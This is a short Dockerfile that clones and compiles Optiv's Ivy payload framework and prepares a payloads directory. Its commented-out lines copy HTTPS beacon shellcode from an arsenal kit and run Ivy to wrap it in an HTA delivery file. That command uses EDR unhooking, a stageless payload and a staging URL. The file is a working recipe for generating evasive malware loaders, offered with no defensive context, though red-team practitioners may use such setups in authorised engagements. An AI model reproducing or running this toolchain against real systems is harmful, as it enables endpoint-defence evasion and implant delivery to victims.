# syntax=docker/dockerfile:1

FROM golang:1.18-alpine

RUN apk update && apk add git

RUN git clone https://github.com/optiv/Ivy
RUN git clone https://github.com/fatih/color
RUN git clone https://github.com/KyleBanks/XOREncryption

#WORKDIR /color
RUN cd color; go build color.go

#WORKDIR /XOREncryption/Go
RUN cd XOREncryption/Go; go build xor.go

#WORKDIR /Ivy
RUN cd Ivy; go build Ivy.go

RUN mkdir /go/payloads

ENTRYPOINT ["/go/Ivy/Ivy"]

#COPY ../payloads/arsenal-kit-payloads/https.x64.bin Ivy/.
#COPY ../payloads/arsenal-kit-payloads/https.x86.bin Ivy/.

#RUN ./Ivy -Ix64 https.x64.bin -Ix86 https.x86.bin -O 09-https-ivy.hta -P Local -debug -delivery hta -stageless -unhook -url https://our.domain/



 




